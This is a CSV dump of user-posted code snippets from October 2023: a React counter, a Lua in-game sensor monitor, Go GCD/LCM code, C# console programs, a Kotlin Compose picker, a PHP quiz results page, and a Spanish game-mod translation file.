id,title,username,language,date,content
8A4Fc51E,counter,Diaxon,JavaScript,Wednesday 18th of October 2023 01:03:53 PM CDT,"import React, {useState} from ""react"";
import 'bootstrap/dist/css/bootstrap.css';

function App(){
  const [count, setCount] = useState(0);

  return(
    <div className=""container my-5"">
      <div className=""card text-center my-5"">
        <div className=""card-header"">
          <h1>Counter App</h1>
        </div>
        <div className=""card-body"">
          <h1>{count}</h1>
        </div>
        <div className=""card-footer"">
          <button className=""btn btn-success mx-2"" onClick={() => setCount(count + 1)}>Increment</button>
          <button className=""btn btn-danger mx-2"" onClick={() => setCount(count - 1)}>Decrement</button>
          <button className=""btn btn-primary mx-2"" onClick={() => setCount(0)}>Reset</button>
        </div>

      </div>
    </div>
  )

}

export default App;"
5DCyh7Tr,startup,MagmaLP,Lua,Wednesday 18th of October 2023 01:03:40 PM CDT,"os.loadAPI(""ocs/apis/sensor"")
sen = sensor.wrap(""bottom"")
mon = peripheral.wrap(""left"")
state = false

mon.setTextScale(1)
mon.clear()

while true do
	s = sen.getTargets()
	function getS()
		for v, k  in pairs(s) do
			if k.Name == ""ME Wireless Access Point"" then   
				target = v
			end
		end
		return target
	end

	f = getS()
	s1 = sen.getTargetDetails(target)

	for v, k in pairs(s1.Items) do
   		if k.Name == ""Low Voltage Solar Array"" then
        	if state == false then
            	lv1 = k.Size
                print(""LV Rechenwert 1: ""..lv1)
        	elseif state == true then
            	lv2 = k.Size
                print(""LV Rechenwert 2: ""..lv2)
   				calc = (lv2 - lv1) * 6
				calc2 = calc * 60
				mon.setCursorPos(1,2)
    			mon.write(""LV Solars/min:  ""..calc)
				mon.setCursorPos(1,3)
    			mon.write(""LV Solars/h:    ""..calc2)
				mon.setCursorPos(1,8)
    			mon.write(""LVs auf Lager:  ""..lv2)
        	else
            	print(""Error(1)"")
        	end

		elseif k.Name == ""UU-Matter"" then
        	if state == false then
           		uu1 = k.Size
                print(""UU Rechenwert 1:  ""..uu1)
        	elseif state == true then
            	uu2 = k.Size
                print(""UU Rechenwert 2:  ""..uu2)
   				calc = (uu2 - uu1) * 6
   				calc2 = calc * 60
				mon.setCursorPos(1,5)
    			mon.write(""UU-Matter/min:  ""..calc)
				mon.setCursorPos(1,6)
    			mon.write(""UU-Matter/h:    ""..calc2)
				mon.setCursorPos(1,10)
    			mon.write("" UU auf Lager:  ""..uu2)
        	else
            	print(""Error(1)"")
        	end
        elseif k.Name == ""High Voltage Solar Array"" then
            hv = k.Size
            print(""HV Istwert:  ""..hv)
            mon.setCursorPos(1,9)
            mon.write(""HVs auf Lager:  ""..hv)
        end
	end
 	if state == true then
   		state = false
 	else
   		state = true
 	end
    for i = 10,1,-1 do
        if i <= 9 then 
            mon.setCursorPos(18,11)
            mon.write(""reboot in:  ""..i)
        end
        mon.setCursorPos(17,11)
        mon.write(""reboot in: ""..i)
        sleep(1)
    end
end"
i44wDPBB,нок и нод golang,marfach,Go,Wednesday 18th of October 2023 12:41:18 PM CDT,"package main

import (
	""fmt""
	""os""
)

// НОД
func findGCD(a, b int64) int64 {
	for b != 0 {
		temp := b
		b = a % b
		a = temp
	}
	return a
}

//НОК
func findLCM(a, b int64) int64 {
	gcd := findGCD(a, b)
	lcm := (a * b) / gcd
	return lcm
}

// Функция для нахождения НОК и НОД массива чисел
func findLCMAndGCD(numbers []int64) (int64, int64, error) {
	if len(numbers) == 0 {
		return 0, 0, fmt.Errorf(""массив чисел пуст"")
	}

	lcm := numbers[0]
	gcd := numbers[0]

	for i := 1; i < len(numbers); i++ {
		number := numbers[i]
		if number == 0 {
			return 0, 0, fmt.Errorf(""найдено число равное нулю"")
		}
		lcm = findLCM(lcm, number)
		gcd = findGCD(gcd, number)
	}

	return lcm, gcd, nil
}

func main() {
	numbers := []int64{12, 16, 24, 36}
	lcm, gcd, err := findLCMAndGCD(numbers)

	if err != nil {
		fmt.Println(""Ошибка:"", err)
		os.Exit(1)
	}
	for _, i := range numbers {
		if i < 0 {
			fmt.Println(""Должны быть только положительные числа."")
			os.Exit(1)
		}

	}

	fmt.Println(""НОК: "", lcm)
	fmt.Println(""НОД: "", gcd)
}
"
L2pR4Yrw,Консольное меню,Yaniha,C#,Wednesday 18th of October 2023 12:27:34 PM CDT,"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using static System.Net.Mime.MediaTypeNames;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandSayMyName = ""SayMyName"";
            const string CommandChangePassword = ""ChangePassword"";
            const string CommandChangeConsoleColor = ""ChangeConsoleColor"";
            const string CommandChangeBackgroundColor = ""ChangeBackgroundColor"";
            const string CommandChangeBackgroundColorBlue = ""Blue"";
            const string CommandChangeBackgroundColorBlack = ""Black"";
            const string CommandChangeTextColor = ""ChangeTextColor"";
            const string CommandChangeTextColorYellow = ""Yellow"";
            const string CommandChangeTextColorWhite = ""White"";
            const string CommandGoPlay = ""GoPlay"";
            const string CommandExit = ""exit"";

            Random rand = new Random();
            string userName;
            string userPassword;
            string userInput;
            bool isWorking = true;
            int number;
            int playerNumber;
            int minVolueNumber = 1;
            int maxVolueNumber = 11;
            int attempts = 4;

            Console.WriteLine(""Меня зовут Ева. Я вашь консольный ассистент. Как мне к вам обращаться?"");
            userName = Console.ReadLine();
            Console.WriteLine($""Здравствуй, {userName}. Придумайте себе пароль."");
            userPassword = Console.ReadLine();
            Console.WriteLine(""Отлично. Давайте я покажу вам что я могу делать.\nНажмите любую кнопку чтобы продолжить..."");
            Console.ReadKey();
            Console.Clear();

            while (isWorking)
            {
                Console.Clear();
                Console.WriteLine(""Введите любую команду из представленных ниже:"");
                Console.WriteLine($""{CommandSayMyName} - Напомнить ваше имя"");
                Console.WriteLine($""{CommandChangePassword} - Сменить пароль"");
                Console.WriteLine($""{CommandChangeConsoleColor} - Сменить оформление"");
                Console.WriteLine($""{CommandGoPlay} - Сыграть в угадай число"");
                Console.WriteLine($""{CommandExit} - Выход"");

                userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandSayMyName:
                        Console.Clear();
                        Console.WriteLine(""Как вы могли забыть свое имя? Вы в норме? Введите пароль, чтобы я поняла, что это настоящий вы."");
                        userInput = Console.ReadLine();

                        if (userInput == userPassword)
                        {
                            Console.WriteLine($""Как вы могли забыть, выс зовут {userName}. Больше не забывайте"");
                        }
                        else
                        {
                            Console.WriteLine(""Извините, но я не могу вам выдать имя владельца этого аккаунта. Боюсь что ему это не понравится."");
                        }

                        Console.WriteLine(""Нажмите любую кнопку чтобы продолжить..."");
                        Console.ReadKey();
                        break;

                    case CommandChangePassword:
                        Console.Clear();
                        Console.WriteLine(""Введите старый пароль:"");
                        userInput = Console.ReadLine();

                        if (userInput == userPassword)
                        {
                            Console.WriteLine(""Введите новый пароль:"");
                            userPassword = Console.ReadLine();
                            Console.WriteLine(""Пароль успешно изменен."");
                        }
                        else
                        {
                            Console.WriteLine(""Пароль неверный. Извините, но я не помочь вам."");
                        }

                        Console.WriteLine(""Нажмите любую кнопку чтобы продолжить..."");
                        Console.ReadKey();
                        break;

                    case CommandChangeConsoleColor:
                        Console.Clear();
                        Console.WriteLine(""Что хотите изменить?"");
                        Console.WriteLine($""{CommandChangeBackgroundColor} - Поменять фон"");
                        Console.WriteLine($""{CommandChangeTextColor} - Поменять текст"");
                        userInput = Console.ReadLine();

                        if (userInput == CommandChangeBackgroundColor)
                        {
                            Console.Clear();
                            Console.WriteLine($""Какой фон хотите?\n{CommandChangeBackgroundColorBlue} - Синий\n{CommandChangeBackgroundColorBlack} - Черный"");
                            userInput = Console.ReadLine();

                            if (userInput == CommandChangeBackgroundColorBlue)
                            {
                                Console.BackgroundColor = ConsoleColor.Blue;
                            }
                            else if (userInput == CommandChangeBackgroundColorBlack)
                            {
                                Console.BackgroundColor = ConsoleColor.Black;
                            }
                            else
                            {
                                Console.WriteLine(""Я вас не понимаю чего вы от меня хотите..."");
                                Console.ReadKey();
                            }
                        }
                        else if (userInput == CommandChangeTextColor)
                        {
                            Console.Clear();
                            Console.WriteLine($""Какой текст хотите?\n{CommandChangeTextColorYellow} - Желтый\n{CommandChangeTextColorWhite} - Белый"");
                            userInput = Console.ReadLine();

                            if (userInput == CommandChangeTextColorYellow)
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                            }
                            else if (userInput == CommandChangeTextColorWhite)
                            {
                                Console.ForegroundColor = ConsoleColor.White;
                            }
                            else
                            {
                                Console.WriteLine(""Я вас не понимаю чего вы от меня хотите..."");
                                Console.ReadKey();
                            }
                        }
                        else
                        {
                            Console.WriteLine(""Я вас не понимаю чего вы от меня хотите..."");
                            Console.ReadKey();
                        }
                        break;

                    case CommandGoPlay:
                        number = rand.Next(minVolueNumber, maxVolueNumber);

                        for (int i = attempts; i > 0; i--)
                        {
                            Console.Clear();
                            Console.WriteLine($""Я загадала число от {minVolueNumber} до {maxVolueNumber - 1}. Попробуйте угадать его. У вас {attempts} попыток."");
                            playerNumber = Convert.ToInt32(Console.ReadLine());

                            if (playerNumber == number)
                            {
                                Console.WriteLine($""В яблочко. Это было число {number}"");
                                Console.ReadKey();
                                break;
                            }
                            else if (attempts == 0)
                            {
                                Console.WriteLine($""К сожалению вы не угадали. Это было число {number}"");
                                Console.ReadKey();
                                break;
                            }
                            else
                            {
                                Console.WriteLine(""Мимо. Попробуйте еще раз"");
                                attempts--;
                                Console.ReadKey();
                            }
                        }
                        break;

                    case CommandExit:
                        Console.Clear();
                        isWorking = false;
                        Console.WriteLine(""Программа закрыта."");
                        break;

                    default:
                        Console.Clear();
                        Console.WriteLine(""Я вас не понимаю. Попробуйте еще раз."");
                        Console.ReadKey();
                        break;
                }
            }

            Console.ReadKey();
        }
    }
}"
2ijMR3nU,Untitled,SaintMalthus,C#,Wednesday 18th of October 2023 12:27:15 PM CDT,"// See https://aka.ms/new-console-template for more information

//Inputing Price per sheet
Console.WriteLine(""Input price per sheet."");
double price = double.Parse(Console.ReadLine());

//Inputing Height
Console.WriteLine(""Input your Height."");
double height = double.Parse(Console.ReadLine());

//Inputing Length
Console.WriteLine(""Input your Length"");
double length = double.Parse(Console.ReadLine());

//Calculating the price for price per cm3
double total_Square_Footage = height * length;
double price_Per_cm3 = price / total_Square_Footage;

//Message
Console.WriteLine(""========================="");
Console.WriteLine(string.Empty);

Console.WriteLine(""!!!INCERTING THE CUT PIECE!!!"");

Console.WriteLine(string.Empty);
Console.WriteLine(""========================="");

// Inputing the cm3 for the cutted sheet

Console.WriteLine(""Input your Height."");
double height_Cut_Piece = double.Parse(Console.ReadLine());

Console.WriteLine(""Input your Length"");
double length_Cut_Piece = double.Parse(Console.ReadLine());

double total_Square_For_Cutted_Piece = height_Cut_Piece * length_Cut_Piece;

//Calculating the price for the cutted piece

double cutted_Piece_Price = total_Square_For_Cutted_Piece * price_Per_cm3;

Console.WriteLine($""{cutted_Piece_Price:f2}"");








"
pzbjKHMs,Untitled,EnGold,Kotlin,Wednesday 18th of October 2023 12:26:49 PM CDT,"package com.chargemap.compose.numberpicker

import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.gestures.Orientation
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.foundation.gestures.draggable
import androidx.compose.foundation.gestures.rememberDraggableState
import androidx.compose.foundation.layout.*
import androidx.compose.material.LocalTextStyle
import androidx.compose.material.MaterialTheme
import androidx.compose.material.ProvideTextStyle
import androidx.compose.material.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.layout.Layout
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.IntOffset
import androidx.compose.ui.unit.dp
import kotlinx.coroutines.launch
import kotlin.math.abs
import kotlin.math.roundToInt

private fun <T> getItemIndexForOffset(
    range: List<T>,
    value: T,
    offset: Float,
    halfNumbersColumnHeightPx: Float
): Int {
    val indexOf = range.indexOf(value) - (offset / halfNumbersColumnHeightPx).toInt()
    return maxOf(0, minOf(indexOf, range.count() - 1))
}

@Composable
fun <T> ListItemPicker(
    modifier: Modifier = Modifier,
    label: (T) -> String = { it.toString() },
    value: T,
    onValueChange: (T) -> Unit,
    dividersColor: Color = MaterialTheme.colors.primary,
    list: List<T>,
    textStyle: TextStyle = LocalTextStyle.current,
) {
    val minimumAlpha = 0.3f
    val verticalMargin = 8.dp
    val numbersColumnHeight = 80.dp
    val halfNumbersColumnHeight = numbersColumnHeight / 2
    val halfNumbersColumnHeightPx = with(LocalDensity.current) { halfNumbersColumnHeight.toPx() }

    val coroutineScope = rememberCoroutineScope()

    val animatedOffset = remember { Animatable(0f) }
        .apply {
            val index = list.indexOf(value)
            val offsetRange = remember(value, list) {
                -((list.count() - 1) - index) * halfNumbersColumnHeightPx to
                        index * halfNumbersColumnHeightPx
            }
            updateBounds(offsetRange.first, offsetRange.second)
        }

    val coercedAnimatedOffset = animatedOffset.value % halfNumbersColumnHeightPx

    val indexOfElement = getItemIndexForOffset(list, value, animatedOffset.value, halfNumbersColumnHeightPx)

    var dividersWidth by remember { mutableStateOf(0.dp) }

    Layout(
        modifier = modifier
            .draggable(
                orientation = Orientation.Vertical,
                state = rememberDraggableState { deltaY ->
                    coroutineScope.launch {
                        animatedOffset.snapTo(animatedOffset.value + deltaY)
                    }
                },
                onDragStopped = { velocity ->
                    coroutineScope.launch {
                        val endValue = animatedOffset.fling(
                            initialVelocity = velocity,
                            animationSpec = exponentialDecay(frictionMultiplier = 20f),
                            adjustTarget = { target ->
                                val coercedTarget = target % halfNumbersColumnHeightPx
                                val coercedAnchors =
                                    listOf(-halfNumbersColumnHeightPx, 0f, halfNumbersColumnHeightPx)
                                val coercedPoint = coercedAnchors.minByOrNull { abs(it - coercedTarget) }!!
                                val base = halfNumbersColumnHeightPx * (target / halfNumbersColumnHeightPx).toInt()
                                coercedPoint + base
                            }
                        ).endState.value

                        val result = list.elementAt(
                            getItemIndexForOffset(list, value, endValue, halfNumbersColumnHeightPx)
                        )
                        onValueChange(result)
                        animatedOffset.snapTo(0f)
                    }
                }
            )
            .padding(vertical = numbersColumnHeight / 3 + verticalMargin * 2),
        content = {
            Box(
                modifier
                    .width(dividersWidth)
                    .height(2.dp)
                    .background(color = dividersColor)
            )
            Box(
                modifier = Modifier
                    .padding(vertical = verticalMargin, horizontal = 20.dp)
                    .offset { IntOffset(x = 0, y = coercedAnimatedOffset.roundToInt()) }
            ) {
                val baseLabelModifier = Modifier.align(Alignment.Center)
                ProvideTextStyle(textStyle) {
                    if (indexOfElement > 0)
                        Label(
                            text = label(list.elementAt(indexOfElement - 1)),
                            modifier = baseLabelModifier
                                .offset(y = -halfNumbersColumnHeight)
                                .alpha(maxOf(minimumAlpha, coercedAnimatedOffset / halfNumbersColumnHeightPx))
                        )
                    Label(
                        text = label(list.elementAt(indexOfElement)),
                        modifier = baseLabelModifier
                            .alpha(
                                (maxOf(
                                    minimumAlpha,
                                    1 - abs(coercedAnimatedOffset) / halfNumbersColumnHeightPx
                                ))
                            )
                    )
                    if (indexOfElement < list.count() - 1)
                        Label(
                            text = label(list.elementAt(indexOfElement + 1)),
                            modifier = baseLabelModifier
                                .offset(y = halfNumbersColumnHeight)
                                .alpha(maxOf(minimumAlpha, -coercedAnimatedOffset / halfNumbersColumnHeightPx))
                        )
                }
            }
            Box(
                modifier
                    .width(dividersWidth)
                    .height(2.dp)
                    .background(color = dividersColor)
            )
        }
    ) { measurables, constraints ->
        // Don't constrain child views further, measure them with given constraints
        // List of measured children
        val placeables = measurables.map { measurable ->
            // Measure each children
            measurable.measure(constraints)
        }

        dividersWidth = placeables
            .drop(1)
            .first()
            .width
            .toDp()

        // Set the size of the layout as big as it can
        layout(dividersWidth.toPx().toInt(), placeables
            .sumOf {
                it.height
            }
        ) {
            // Track the y co-ord we have placed children up to
            var yPosition = 0

            // Place children in the parent layout
            placeables.forEach { placeable ->

                // Position item on the screen
                placeable.placeRelative(x = 0, y = yPosition)

                // Record the y co-ord placed up to
                yPosition += placeable.height
            }
        }
    }
}

@Composable
private fun Label(text: String, modifier: Modifier) {
    Text(
        modifier = modifier.pointerInput(Unit) {
            detectTapGestures(onLongPress = {
                // FIXME: Empty to disable text selection
            })
        },
        text = text,
        textAlign = TextAlign.Center,
    )
}

private suspend fun Animatable<Float, AnimationVector1D>.fling(
    initialVelocity: Float,
    animationSpec: DecayAnimationSpec<Float>,
    adjustTarget: ((Float) -> Float)?,
    block: (Animatable<Float, AnimationVector1D>.() -> Unit)? = null,
): AnimationResult<Float, AnimationVector1D> {
    val targetValue = animationSpec.calculateTargetValue(value, initialVelocity)
    val adjustedTarget = adjustTarget?.invoke(targetValue)
    return if (adjustedTarget != null) {
        animateTo(
            targetValue = adjustedTarget,
            initialVelocity = initialVelocity,
            block = block
        )
    } else {
        animateDecay(
            initialVelocity = initialVelocity,
            animationSpec = animationSpec,
            block = block,
        )
    }
}
"
RQ6p7aKG,Untitled,d4r10,PHP,Wednesday 18th of October 2023 12:14:13 PM CDT,"<?php
session_start();

if (!isset($_SESSION['score']) || !isset($_SESSION['userAnswers'])) {
    header('Location: quiz.php');
    exit;
}


$score = $_SESSION['score'];
$userAnswers = $_SESSION['userAnswers'];

include('questions.php');
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Quiz Results</title>
    <!-- Include necessary styles and scripts for the results page -->
    <style>
         table {
            border-collapse: collapse;
            width: 50%;
        }

        table, th, td {
            border: 1px solid black;
        }

        th, td {
            padding: 10px;
            text-align: left;
        }
    </style>
</head>
<body>

    <h1>PHP Quiz Results</h1>
    <!-- <p style=""font-size: 24px;"">Your Score: <?php echo $score; ?></p> -->
    
    <table>
        <tr>
            <th>Category</th>
            <th>Value</th>
        </tr>
        <tr>
            <td>Total Questions</td>
            <td><?php echo count($questions); ?></td>
        </tr>
        <tr>
            <td>Right Answers</td>
            <td><?php echo $score; ?></td>
        </tr>
        <tr>
            <td>Wrong Answers</td>
            <td><?php echo count($questions) - $score; ?></td>
        </tr>
        <tr>
            <td>Score</td>
            <td><?php echo $score; ?></td>
        </tr>
        <tr>
            <td>Overall Score</td>
            <td><?php echo number_format(($score / count($questions)) * 100, 2) . ""%""; ?></td>
        </tr>
    </table>

    <h2>Answer Overview</h2>
    <ul>
        <?php
        foreach ($questions as $questionId => $questionData) {
            $question = $questionData['question'];
            $choices = $questionData['choices'];
            $correctAnswer = $correctAnswers[$questionId];
            $selectedAnswer = $userAnswers[$questionId];

            $result = ($selectedAnswer == $correctAnswer) ? 'Correct' : 'Incorrect';

            echo ""<li>$question</li>"";
            echo ""<ul>"";
            echo ""<li>Your Answer: $choices[$selectedAnswer]</li>"";
            echo ""<li>Correct Answer: $choices[$correctAnswer]</li>"";
            echo ""<li>Result: <span style='color: "" . ($result === 'Correct' ? 'green' : 'red') . ""'>$result</span></li>"";
            echo ""</ul>"";
            echo ""<br>"";
        }
        ?>
    </ul>

    <a href=""quiz.php"">Take the quiz again</a>
</body>
</html>
"
pqnY3jCS,Spanish (ES) translation of More Maneuvers,H4wK32,XML,Wednesday 18th of October 2023 12:08:36 PM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<contentList>
	<content contentuid=""h3152f408gb853g424dga0e0g64527b02f5f8"" version=""1"">Emboscada</content>
	<content contentuid=""hde92f13eg2dc7g4cc3gaa82g3ad4568b8a21"" version=""1"">Emboscada (Iniciativa)</content>
	<content contentuid=""h9f75d84bgf2a8g4ebag953egabeb768be6dd"" version=""1"">Emboscada (Sigilo)</content>
	<content contentuid=""hfea14b8fg81d3g4b3cg801bge09e50a27630"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para ganar una bonificación en Sigilo o a la tirada de Iniciativa.</content>
	<content contentuid=""h6148156bgb45cg4f62g8665g4d21241d08fd"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y añadir el resultado a tu siguiente tirada de Iniciativa.</content>
	<content contentuid=""hf7858e6ag61fdg4c72gb238gfd23fa09df9d"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para añadir [1] a tus tiradas de &lt;LSTag Tooltip=""Stealth""&gt;Destreza (Sigilo)&lt;/LSTag&gt;, durante 1 minuto (o durante 1 ronda, si estás en combate).</content>
	<content contentuid=""h3359a51fgad6cg4c41g83baga8d9dedb349a"" version=""1"">El resultado de tu siguiente tirada de Iniciativa aumenta en [1].</content>
	<content contentuid=""h05c58613g3d87g4fcfg842cg2f38a53c0398"" version=""1"">[1] adicional a las tiradas de Destreza (Sigilo).</content>
	<content contentuid=""h635f196ag5801g4f3eg9b8fgac904df4dc3b"" version=""1"">Señuelo y Cambio</content>
	<content contentuid=""h4a9ba909g2b60g43a5ga8c0g6489bab77f0f"" version=""1"">Señuelo y Cambio (Aliado)</content>
	<content contentuid=""h856f2404g11ecg448dga0bbg8dad1981c092"" version=""1"">Señuelo y Cambio (Propio)</content>
	<content contentuid=""h47034813ga3dag4a50g82c1ga9b58b1e98f3"" version=""1"">Cuando estás a [1] de una criatura amistosa, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y [1] de movimiento para cambiar de lugar con esa criatura, siempre que ésta no esté incapacitada. Este movimiento no provoca ataques de oportunidad.&lt;br&gt;&lt;br&gt;Tira el dado de supremacía. Hasta el comienzo de tu siguiente turno, tú o la otra criatura (a tu elección) gana una bonificación a la &lt;LSTag Tooltip=""ArmourClass""&gt;CA&lt;/LSTag&gt; igual al número obtenido en la tirada.</content>
	<content contentuid=""h799e724bg96c6g4ee7gabdfg4734880cd2b1"" version=""1"">Cambia de lugar con un aliado cercano y otórgale una bonificación a la &lt;LSTag Tooltip=""ArmourClass""&gt;CA&lt;/LSTag&gt; hasta el comienzo de tu siguiente turno.</content>
	<content contentuid=""h0570ea35gfa19g42b4gb1c9gd419093b773f"" version=""1"">Cambia de lugar con un aliado cercano y otórgate a ti mismo una bonificación a la &lt;LSTag Tooltip=""ArmourClass""&gt;CA&lt;/LSTag&gt; hasta el comienzo de tu siguiente turno.</content>
	<content contentuid=""hb26c7a9dg969eg4265gbcffg63a1e9d14eab"" version=""1"">&lt;LSTag Tooltip=""ArmourClass""&gt;CA&lt;/LSTag&gt; aumentada en [1].</content>
	<content contentuid=""h4f9fd43eg1f44g41aegb9b8g517b17ba1d2a"" version=""1"">Prepararse</content>
	<content contentuid=""h6966a00dgd564g43e2ga556g83b6af5abb02"" version=""1"">Prepararse</content>
	<content contentuid=""hdb9db212gc525g459fg9ce7g2ceab5f899dc"" version=""1"">Prepararse</content>
	<content contentuid=""hc58760f8ga6afg4f5fg8d54gfd32677b7063"" version=""1"">Cuando una criatura que puedes ver entra en el alcance que tienes con el arma cuerpo a cuerpo que estás empuñando, puedes usar tu reacción para gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y hacer un ataque a la criatura, usando esa arma. Si el ataque impacta, añade el dado de supremacía a la tirada de daño del arma.</content>
	<content contentuid=""ha78522a3g7f21g40b2g9557g2a02534f81ea"" version=""1"">Carga</content>
	<content contentuid=""ha65dc6b2g3e0ag4046gb13fgef41dd63e539"" version=""1"">Como una &lt;LSTag Type=""ActionResource"" Tooltip=""BonusActionPoint""&gt;acción adicional&lt;/LSTag&gt;, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y tomar la acción de Correr. Si te mueves, al menos, [1] antes de golpear con un ataque cuerpo a cuerpo durante este turno, puedes añadir el dado de supremacía a la tirada de daño del ataque.</content>
	<content contentuid=""h13d25291gb181g4c32gb52eg950ea7035d3c"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y toma la acción de Correr. Si te mueves, al menos, [1] antes de golpear con un ataque cuerpo a cuerpo durante este turno, añade [2] a la tirada de daño.</content>
	<content contentuid=""h71193703ge214g4ec7gb9bdg4034601f63be"" version=""1"">Causando [1] de daño adicional gracias a tu impulso.</content>
	<content contentuid=""hf163d03dgf62ag4b53ga6c8gf7b7942ef393"" version=""1"">Presencia Dominante</content>
	<content contentuid=""h4af096d9g1d18g4e67ga341gc88f60642a68"" version=""1"">Presencia Dominante (Intimidación/Persuasión)</content>
	<content contentuid=""h8ae35b23gedf0g42dag81f9g745b2088c4f1"" version=""1"">Presencia Dominante (Interpretación)</content>
	<content contentuid=""h25686c0cg57c3g403ag9591gdd04976e7ffb"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para ganar una bonificación a las tiradas de &lt;LSTag Tooltip=""Intimidation""&gt;Carisma (Intimidación)&lt;/LSTag&gt;, &lt;LSTag Tooltip=""Performance""&gt;Carisma (Interpretación)&lt;/LSTag&gt; o &lt;LSTag Tooltip=""Persuasion""&gt;Carisma (Persuasión)&lt;/LSTag&gt;.</content>
	<content contentuid=""h1504ffa8g3916g4010g835cgb894972f06e8"" version=""1"">Cuando haces una tirada de &lt;LSTag Tooltip=""Intimidation""&gt;Carisma (Intimidación)&lt;/LSTag&gt; o &lt;LSTag Tooltip=""Persuasion""&gt;Carisma (Persuasión)&lt;/LSTag&gt;, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y añadir [1] a la tirada.&lt;br&gt;&lt;br&gt;NO LANZAR MANUALMENTE!!!&lt;br&gt;(Actívalo en la ventana de diálogo de la tirada)</content>
	<content contentuid=""h16d348d6gcd3dg42d4g823bgde83f60ce2d5"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y, durante el minuto siguiente (o hasta la siguiente ronda, si estás en combate), cuando realices una tirada de &lt;LSTag Tooltip=""Performance""&gt;Carisma (Interpretación)&lt;/LSTag&gt;, añade [1] a la tirada.</content>
	<content contentuid=""hc30142a4g2a01g4cdbg884eg9fbdbc35f2e8"" version=""1"">[1] adicional a las tiradas de Carisma (Interpretación).</content>
	<content contentuid=""hae9c23begccf4g4784ga53cgafab0415290a"" version=""1"">Ataque y agarre</content>
	<content contentuid=""hbafdf290gb78bg430fgb086gc3fbab6848f0"" version=""1"">Ataque y agarre</content>
	<content contentuid=""hb8a9639ageb5ag4db7g895dg28fece47a657"" version=""1"">Inmediatamente después de golpear a una criatura con un ataque cuerpo a cuerpo en tu turno, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y luego intentar agarrar al objetivo como una acción adicional. Añade el dado de supremacía a tu tirada de &lt;LSTag Tooltip=""Athletics""&gt;Fuerza (Atletismo)&lt;/LSTag&gt;.</content>
	<content contentuid=""h37d6ff72gfc1fg4a67g9694g1c927e14ad7b"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; e intenta apresar al objetivo como una acción adicional. Añade el dado de supremacía a tu tirada de &lt;LSTag Tooltip=""Athletics""&gt;Fuerza (Atletismo)&lt;/LSTag&gt;.</content>
	<content contentuid=""hcf2c63a0g4d0cg4542ga28dgd2f3d0721588"" version=""1"">Ataque de arremetida</content>
	<content contentuid=""ha919c46dg8ce9g4f94gaba7g707215b47ae9"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para aumentar el alcance de uno de tus ataques cuerpo a cuerpo en [1] y, si impacta, añades el dado de supremacía a la tirada de daño de ese ataque.</content>
	<content contentuid=""h9b81e5d2g1f51g4b54g9726g4f3aa7fe284b"" version=""1"">Aumenta el alcance del siguiente ataque cuerpo a cuerpo que realices antes del final de tu siguiente turno en [1]. Si el ataque impacta, inflige [2] de daño adicional.</content>
	<content contentuid=""h8e13d812g8531g43a2ga8d6ga4c1755565eb"" version=""1"">Lanzamiento rápido</content>
	<content contentuid=""hef0821c8gaafdg4865gb7d8g5e67edb5bb2e"" version=""1"">Como una &lt;LSTag Type=""ActionResource"" Tooltip=""BonusActionPoint""&gt;acción adicional&lt;/LSTag&gt;, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y hacer un ataque a distancia con un arma que tenga la propiedad ""Arrojadiza"". Puedes sacar el arma como parte de este ataque. Si el ataque impacta, añade el dado de supremacía a la tirada de daño de ese ataque.</content>
	<content contentuid=""h69cdea81ga3f8g47ffg8a5cg6d887161aada"" version=""1"">Evaluación táctica</content>
